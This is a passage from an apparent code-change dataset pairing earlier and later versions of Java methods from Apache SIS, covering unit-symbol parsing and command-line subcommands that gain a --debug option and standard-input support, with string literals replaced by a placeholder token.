if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.DAY;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.HOUR;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.MINUTE;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return SI.SECOND;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.PIXEL;
if (isCelsius(uom)) return SI.CELSIUS;
if (uom.isEmpty()) return Unit.ONE;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return PPM;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return PSU;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return SIGMA;
}
final Unit<?> unit;
try {
unit=Unit.valueOf(uom);
}
 catch (IllegalArgumentException e) {
throw Exceptions.setMessage(e,Errors.format(Errors.Keys.IllegalArgumentValue_2,""String_Node_Str"",uom),true);
}
if (unit.isCompatible(SI.HERTZ) && !uom.equals(""String_Node_Str"")) {
return SI.HERTZ;
}
return UnitsMap.canonicalize(unit);
}","/** 
 * Parses the given symbol. This method is similar to   {@link Unit#valueOf(CharSequence)}, but hands especially a few symbols found in WKT parsing or in XML files. The list of symbols handled especially is implementation-dependent and may change in future SIS versions. <div class=""section"">Parsing authority codes</div> As a special case, if the given   {@code uom} arguments is of the form {@code ""EPSG:####""}or   {@code ""urn:ogc:def:uom:EPSG:####""} (ignoring case and whitespaces), then {@code ""####""}is parsed as an integer and forwarded to the   {@link #valueOfEPSG(int)} method.<div class=""section"">NetCDF unit symbols</div> The attributes in NetCDF files often merge the axis direction with the angular unit, as in  {@code ""degrees_east""} or {@code ""degrees_north""}. This   {@code valueOf} methodignores those suffixes and unconditionally returns  {@link NonSI#DEGREE_ANGLE} for allaxis directions. In particular, the units for  {@code ""degrees_west""} and {@code ""degrees_east""}do <strong>not</strong> have opposite sign. It is caller responsibility to handle the direction of axes associated to NetCDF units.
 * @param uom The symbol to parse, or {@code null}.
 * @return The parsed symbol, or {@code null} if {@code uom} was null.
 * @throws IllegalArgumentException if the given symbol can not be parsed.
 */
public static Unit<?> valueOf(String uom) throws IllegalArgumentException {
  if (uom == null) {
    return null;
  }
  uom=trimWhitespaces(CharSequences.toASCII(uom)).toString();
  final int length=uom.length();
  if (isURI(uom)) {
    String code=DefinitionURI.codeOf(""String_Node_Str"",Constants.EPSG,uom);
    if (code != null && code != uom)     try {
      return valueOfEPSG(Integer.parseInt(code));
    }
 catch (    NumberFormatException e) {
      throw new IllegalArgumentException(Errors.format(Errors.Keys.IllegalArgumentValue_2,""String_Node_Str"",uom),e);
    }
    code=XPaths.xpointer(""String_Node_Str"",uom);
    if (code != null) {
      uom=code;
    }
  }
  if (uom.regionMatches(true,0,""String_Node_Str"",0,3)) {
switch (length) {
case 3:
      return NonSI.DEGREE_ANGLE;
case 4:
{
      if (uom.charAt(3) == 'K') {
        return SI.KELVIN;
      }
      break;
    }
}
String prefix=uom;
boolean isTemperature=false;
final int s=Math.max(uom.lastIndexOf(' '),uom.lastIndexOf('_'));
if (s >= 1) {
  final String suffix=(String)trimWhitespaces(uom,s + 1,length);
  if (ArraysExt.containsIgnoreCase(CARDINAL_DIRECTIONS,suffix) || (isTemperature=isCelsius(suffix))) {
    prefix=(String)trimWhitespaces(uom,0,s);
  }
}
if (equalsIgnorePlural(prefix,""String_Node_Str"")) {
  return isTemperature ? SI.CELSIUS : NonSI.DEGREE_ANGLE;
}
}
 else {
if (uom.equals(""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.DEGREE_ANGLE;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return NonSI.SECOND_ANGLE;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.GRADE;
if (uom.equalsIgnoreCase(""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.RADIAN;
if (equalsIgnorePlural(uom,""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.KILOMETRE;
if (equalsIgnorePlural(uom,""String_Node_Str"") || equalsIgnorePlural(uom,""String_Node_Str"")) return SI.METRE;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.WEEK;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.DAY;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.HOUR;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.MINUTE;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return SI.SECOND;
if (equalsIgnorePlural(uom,""String_Node_Str"")) return NonSI.PIXEL;
if (isCelsius(uom)) return SI.CELSIUS;
if (uom.isEmpty()) return Unit.ONE;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return PPM;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return PSU;
if (uom.equalsIgnoreCase(""String_Node_Str"")) return SIGMA;
}
final Unit<?> unit;
try {
unit=Unit.valueOf(uom);
}
 catch (IllegalArgumentException e) {
throw Exceptions.setMessage(e,Errors.format(Errors.Keys.IllegalArgumentValue_2,""String_Node_Str"",uom),true);
}
if (unit.isCompatible(SI.HERTZ) && !uom.equals(""String_Node_Str"")) {
return SI.HERTZ;
}
return UnitsMap.canonicalize(unit);
}"
91945,"/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP));
}","/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP,Option.DEBUG));
}"
91946,"/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}","/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(args,e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(args,e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}"
91947,"/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 */
private static void error(final Exception e){
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    err.println(e.getLocalizedMessage());
    err.flush();
  }
 else {
    final PrintStream err=System.err;
    err.println(e.getLocalizedMessage());
    err.flush();
  }
}","/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 * @param args The command line arguments, used only for detecting if the {@code --debug} option was present.
 */
private static void error(final String[] args,final Exception e){
  final boolean debug=ArraysExt.containsIgnoreCase(args,Option.PREFIX + ""String_Node_Str"");
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
 else {
    @SuppressWarnings(""String_Node_Str"") final PrintStream err=System.err;
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
}"
91948,"/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91949,"/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP));
  this.isCRS=isCRS;
}","/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP,Option.DEBUG));
  this.isCRS=isCRS;
}"
91950,"/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  if (hasUnexpectedFileCount(1,1)) {
    return Command.INVALID_ARGUMENT_EXIT_CODE;
  }
  final Metadata metadata;
  final DataStore store=DataStores.open(files.get(0));
  try {
    metadata=store.getMetadata();
  }
  finally {
    store.close();
  }
  if (metadata == null) {
    return 0;
  }
  Object object=metadata;
  if (isCRS) {
    boolean found=false;
    for (    final ReferenceSystem rs : metadata.getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        object=(CoordinateReferenceSystem)rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(object,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(object,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(object,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}","/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override @SuppressWarnings(""String_Node_Str"") public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  Object metadata;
  if (useStandardInput()) {
    DataStore store=DataStores.open(System.in);
    try {
      metadata=store.getMetadata();
    }
  finally {
      store.close();
    }
  }
 else {
    if (hasUnexpectedFileCount(1,1)) {
      return Command.INVALID_ARGUMENT_EXIT_CODE;
    }
    DataStore store=DataStores.open(files.get(0));
    try {
      metadata=store.getMetadata();
    }
  finally {
      store.close();
    }
  }
  if (metadata == null) {
    return 0;
  }
  if (isCRS && (metadata instanceof Metadata)) {
    boolean found=false;
    for (    final ReferenceSystem rs : ((Metadata)metadata).getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        metadata=rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(metadata,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(metadata,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(metadata,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}"
91951,"/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""mime-type""} sub-command.
 */
MimeTypeSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91952,"/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<Option,String>(Option.class);
  files=new ArrayList<String>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault();
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}","/** 
 * Creates a new sub-command with the given command-line arguments. The   {@code arguments} array is the same array than the one given to the {@code main(String[])} method.The argument at index  {@code commandIndex} is the name of this command, and will be ignored except forthe special  {@value #TEST} value which is used only at JUnit testing time.
 * @param commandIndex Index of the {@code args} element containing the sub-command name.
 * @param arguments    The command-line arguments provided by the user.
 * @param validOptions The command-line options allowed by this sub-command.
 * @throws InvalidOptionException If an illegal option has been provided, or the option has an illegal value.
 */
@SuppressWarnings(""String_Node_Str"") protected SubCommand(final int commandIndex,final String[] arguments,final EnumSet<Option> validOptions) throws InvalidOptionException {
  boolean isTest=false;
  this.validOptions=validOptions;
  options=new EnumMap<Option,String>(Option.class);
  files=new ArrayList<String>(arguments.length);
  for (int i=0; i < arguments.length; i++) {
    final String arg=arguments[i];
    if (i == commandIndex) {
      isTest=arg.equals(TEST);
      continue;
    }
    if (arg.startsWith(Option.PREFIX)) {
      final String name=arg.substring(Option.PREFIX.length());
      final Option option;
      try {
        option=Option.valueOf(name.toUpperCase(Locale.US));
      }
 catch (      IllegalArgumentException e) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),e,name);
      }
      if (!validOptions.contains(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.UnknownOption_1,name),name);
      }
      String value=null;
      if (option.hasValue) {
        if (++i >= arguments.length) {
          throw new InvalidOptionException(Errors.format(Errors.Keys.MissingValueForOption_1,name),name);
        }
        value=arguments[i];
      }
      if (options.containsKey(option)) {
        throw new InvalidOptionException(Errors.format(Errors.Keys.DuplicatedOption_1,name),name);
      }
      options.put(option,value);
    }
 else {
      files.add(arg);
    }
  }
  Option option=null;
  String value=null;
  final Console console;
  final boolean explicitEncoding;
  try {
    debug=options.containsKey(option=Option.DEBUG);
    value=options.get(option=Option.LOCALE);
    locale=(value != null) ? Locales.parse(value) : Locale.getDefault();
    value=options.get(option=Option.TIMEZONE);
    timezone=(value != null) ? TimeZone.getTimeZone(value) : TimeZone.getDefault();
    value=options.get(option=Option.ENCODING);
    explicitEncoding=(value != null);
    encoding=explicitEncoding ? Charset.forName(value) : Charset.defaultCharset();
    value=options.get(option=Option.COLORS);
    console=System.console();
    colors=(value != null) ? Option.COLORS.parseBoolean(value) : (console != null) && X364.isAnsiSupported();
  }
 catch (  RuntimeException e) {
    @SuppressWarnings(""String_Node_Str"") final String name=option.name().toLowerCase(Locale.US);
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,name,value),name);
  }
  if (isTest) {
    final StringWriter s=new StringWriter();
    outputBuffer=s.getBuffer();
    out=new PrintWriter(s);
    err=out;
  }
 else {
    outputBuffer=null;
    err=(console != null) ? console.writer() : new PrintWriter(System.err,true);
    if (!explicitEncoding && console != null) {
      out=console.writer();
    }
 else {
      if (explicitEncoding) {
        out=new PrintWriter(new OutputStreamWriter(System.out,encoding),true);
      }
 else {
        out=new PrintWriter(System.out,true);
      }
    }
  }
}"
91953,"/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  err.println(Exceptions.formatChainedMessages(locale,message,e));
}","/** 
 * Prints the given error message followed by the message in the given exception.
 * @param message The message to print before the exception, or {@code null}.
 * @param e The exception which occurred.
 */
final void error(final String message,final Exception e){
  out.flush();
  if (debug) {
    e.printStackTrace(err);
  }
 else {
    err.println(Exceptions.formatChainedMessages(locale,message,e));
  }
}"
91954,"/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP));
}","/** 
 * Creates the   {@code ""about""} sub-command.
 */
AboutSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.BRIEF,Option.VERBOSE,Option.HELP,Option.DEBUG));
}"
91955,"/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}","/** 
 * Prints the information to the standard output stream.
 * @param args Command-line options.
 */
public static void main(final String[] args){
  final LogManager manager=LogManager.getLogManager();
  if (MonolineFormatter.class.getName().equals(manager.getProperty(ConsoleHandler.class.getName() + ""String_Node_Str""))) {
    MonolineFormatter.install();
  }
  final Command c;
  try {
    c=new Command(args);
  }
 catch (  InvalidCommandException e) {
    error(args,e);
    System.exit(INVALID_COMMAND_EXIT_CODE);
    return;
  }
catch (  InvalidOptionException e) {
    error(args,e);
    System.exit(INVALID_OPTION_EXIT_CODE);
    return;
  }
  int status;
  try {
    status=c.run();
  }
 catch (  Exception e) {
    status=exitCodeFor(e);
  }
  if (status != 0) {
    System.exit(status);
  }
}"
91956,"/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 */
private static void error(final Exception e){
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    err.println(e.getLocalizedMessage());
    err.flush();
  }
 else {
    final PrintStream err=System.err;
    err.println(e.getLocalizedMessage());
    err.flush();
  }
}","/** 
 * Prints the message of the given exception. This method is invoked only when the error occurred before the   {@link SubCommand} has been built, otherwise the {@link SubCommand#err} printer shall be used.
 * @param args The command line arguments, used only for detecting if the {@code --debug} option was present.
 */
private static void error(final String[] args,final Exception e){
  final boolean debug=ArraysExt.containsIgnoreCase(args,Option.PREFIX + ""String_Node_Str"");
  final Console console=System.console();
  if (console != null) {
    final PrintWriter err=console.writer();
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
 else {
    @SuppressWarnings(""String_Node_Str"") final PrintStream err=System.err;
    if (debug) {
      e.printStackTrace(err);
    }
 else {
      err.println(e.getLocalizedMessage());
    }
    err.flush();
  }
}"
91957,"/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP));
}","/** 
 * Creates the   {@code ""help""} sub-command.
 */
HelpSC(final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.LOCALE,Option.ENCODING,Option.HELP,Option.DEBUG));
}"
91958,"/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP));
  this.isCRS=isCRS;
}","/** 
 * Creates the   {@code ""metadata""} or {@code ""crs""} sub-command.
 * @param isCRS {@code true} for the {@code ""crs""} sub-command,or  {@code false} for the {@code ""metadata""} sub-command.
 */
MetadataSC(final boolean isCRS,final int commandIndex,final String... args) throws InvalidOptionException {
  super(commandIndex,args,EnumSet.of(Option.FORMAT,Option.LOCALE,Option.TIMEZONE,Option.ENCODING,Option.COLORS,Option.HELP,Option.DEBUG));
  this.isCRS=isCRS;
}"
91959,"/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
 else   if (isCRS && (format.equalsIgnoreCase(""String_Node_Str"") || format.equalsIgnoreCase(""String_Node_Str""))) {
    outputFormat=Format.WKT;
    convention=Convention.WKT2;
  }
 else   if (isCRS && format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.WKT;
    convention=Convention.WKT1;
  }
 else   if (format.equalsIgnoreCase(""String_Node_Str"")) {
    outputFormat=Format.XML;
  }
 else {
    throw new InvalidOptionException(Errors.format(Errors.Keys.IllegalOptionValue_2,""String_Node_Str"",format),format);
  }
  if (hasUnexpectedFileCount(1,1)) {
    return Command.INVALID_ARGUMENT_EXIT_CODE;
  }
  final Metadata metadata;
  try (DataStore store=DataStores.open(files.get(0))){
    metadata=store.getMetadata();
  }
   if (metadata == null) {
    return 0;
  }
  Object object=metadata;
  if (isCRS) {
    boolean found=false;
    for (    final ReferenceSystem rs : metadata.getReferenceSystemInfo()) {
      if (rs instanceof CoordinateReferenceSystem) {
        object=(CoordinateReferenceSystem)rs;
        found=true;
        break;
      }
    }
    if (!found) {
      return 0;
    }
  }
switch (outputFormat) {
case TEXT:
{
      final TreeTable tree=MetadataStandard.ISO_19115.asTreeTable(metadata,ValueExistencePolicy.NON_EMPTY);
      final TreeTableFormat tf=new TreeTableFormat(locale,timezone);
      tf.setColumns(TableColumn.NAME,TableColumn.VALUE);
      tf.format(tree,out);
      break;
    }
case WKT:
{
    final WKTFormat f=new WKTFormat(locale,timezone);
    if (convention != null) {
      f.setConvention(convention);
    }
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    f.format(object,out);
    out.println();
    break;
  }
case XML:
{
  final MarshallerPool pool=new MarshallerPool(null);
  final Marshaller marshaller=pool.acquireMarshaller();
  marshaller.setProperty(XML.LOCALE,locale);
  marshaller.setProperty(XML.TIMEZONE,timezone);
  if (isConsole()) {
    marshaller.marshal(object,out);
  }
 else {
    out.flush();
    marshaller.setProperty(Marshaller.JAXB_ENCODING,encoding.name());
    marshaller.marshal(object,System.out);
    System.out.flush();
  }
  break;
}
}
out.flush();
return 0;
}","/** 
 * Prints metadata or CRS information.
 * @throws DataStoreException If an error occurred while reading the file.
 * @throws JAXBException If an error occurred while producing the XML output.
 * @throws IOException Should never happen, since we are appending to a print writer.
 */
@Override @SuppressWarnings(""String_Node_Str"") public int run() throws InvalidOptionException, DataStoreException, JAXBException, IOException {
  Convention convention=null;
  final Format outputFormat;
  final String format=options.get(Option.FORMAT);
  if (format == null || format.equalsIgnoreCase(""String_Node_Str"")) {
    if (isCRS) {
      outputFormat=Format.WKT;
      convention=Convention.WKT2_SIMPLIFIED;
    }
 else {
      outputFormat=Format.TEXT;
    }
  }
